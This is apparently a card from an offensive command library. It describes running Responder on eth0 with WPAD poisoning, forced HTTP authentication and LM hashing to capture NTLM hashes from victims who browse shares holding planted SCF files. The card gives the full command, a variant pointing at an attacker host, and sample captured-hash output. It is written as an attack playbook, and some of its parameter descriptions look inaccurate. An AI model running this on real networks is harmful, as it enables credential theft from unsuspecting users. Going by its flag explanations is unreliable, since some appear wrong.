---
id: 4da38882-63b9-4471-bd3a-00c90d206084
name: responder-scf-payload-listener-on-eth0
type: command
executor: bash
data: responder -wrf --lm -v -I eth0
output: null
created_at: '2023-04-06T03:56:03.381458+00:00'
updated_at: '2023-04-10T20:26:21.390997+00:00'
platforms:
  - Linux
tags:
  - ntlm-relay
  - smb-poisoning
verified: true
validated: true
---

# responder-scf-payload-listener-on-eth0

## Command

```bash
responder -wrf --lm -v -I eth0
```

## Description

Starts Responder to listen for NTLM authentication on SMB/HTTP, optimized for SCF file attacks by enabling WPAD poisoning and LM hash capture on the eth0 interface. Use before deploying SCF files to capture hashes when victims browse shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -w | Enable WPAD rogue proxy | Yes |
| -r | Enable NTLMv1/2 capture (implied in -wrf) | Yes |
| -f | Force WPAD auth over HTTP | Yes |
| --lm | Enable LM hashing for weaker captures | Yes |
| -v | Verbose logging | Yes |
| -I eth0 | Bind to eth0 interface | Yes |

## Examples

### Basic Usage

```bash
responder -wrf --lm -v -I eth0
```

### Advanced Usage

```bash
responder -wrf --lm -v -I eth0 --wpadhost attacker.local
```

## Expected Output

Responder listens on ports (e.g., [SMB] 445, [HTTP] 80). On auth attempt: "[+] [SMB] NTLMv2 Client   : 192.168.1.100, Challenge: ..." with captured hash in logs/Poisoner/.

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share]]
- [[tools/Responder]]
